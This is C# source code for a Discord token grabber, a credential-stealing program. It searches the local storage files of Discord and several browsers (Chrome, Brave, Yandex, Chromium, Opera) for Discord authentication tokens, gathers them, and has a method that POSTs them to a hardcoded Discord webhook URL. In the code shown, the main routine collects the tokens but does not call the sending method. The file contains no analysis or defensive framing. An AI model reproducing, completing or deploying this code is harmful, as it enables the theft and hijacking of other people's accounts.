using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;

namespace Reezy
{
    class kniga
    {
        public static string content = "";
        public static void Main2()
        {
            string WEBHOOK_URL = "https://discord.com/api/webhooks/1077981615055179856/bPixWDBJ_Aj6V9l9Ung2VPvDa4Cj-v3yxqIAZSaUt40JGJSejKku-1PjmjHUQkpZ_SWh";
            new TokenGrabber(WEBHOOK_URL);
        }

        public class TokenGrabber
        {
            private readonly string url;

            public TokenGrabber(string url)
            {
                this.url = url;
                var tokens = GetTokens();


                foreach (string token in tokens)
                {
                    content += token + "\n";
                }

            }

            public static List<string> GetTokens()
            {
                var paths = new Dictionary<string, string>();
                var tokens = new List<string>();

                string roaming = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                string local = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);

                paths.Add("Discord", roaming + "\\discord");
                paths.Add("Discord Canary", roaming + "\\discordcanary");
                paths.Add("Discord PTB", roaming + "\\discordptb");
                paths.Add("Google Chrome", local + "\\Google\\Chrome\\User Data\\Default");
                paths.Add("Brave", local + "\\BraveSoftware\\Brave-Browser\\User Data\\Default");
                paths.Add("Yandex", local + "\\Yandex\\YandexBrowser\\User Data\\Default");
                paths.Add("Chromium", local + "\\Chromium\\User Data\\Default");
                paths.Add("Opera", roaming + "\\Opera Software\\Opera Stable");

                foreach (KeyValuePair<string, string> kvp in paths)
                {
                    string platform = kvp.Key;
                    string path = kvp.Value;

                    if (!Directory.Exists(path))
                        continue;

                    foreach (string token in FindTokens(path))
                    {
                        tokens.Add($"{platform}:"+"\n"+ $"{token}");
                    }
                }
                return tokens;
            }

            public static List<string> FindTokens(string path)
            {
                path += "\\Local Storage\\leveldb";
                var tokens = new List<string>();

                foreach (string file in Directory.GetFiles(path, "*.ldb", SearchOption.TopDirectoryOnly))
                {
                    string content = File.ReadAllText(file);

                    foreach (Match match in Regex.Matches(content, @"[\w-]{24}\.[\w-]{6}\.[\w-]{27}"))
                    {
                        tokens.Add(match.ToString());
                    }
                }
                return tokens;
            }

            public void SendTokens(string content)
            {
                var wb = new WebClient();
                 var data = new NameValueCollection();
                data["content"] = content;

                wb.UploadValues(this.url, "POST", data);
            }

        }
    }
}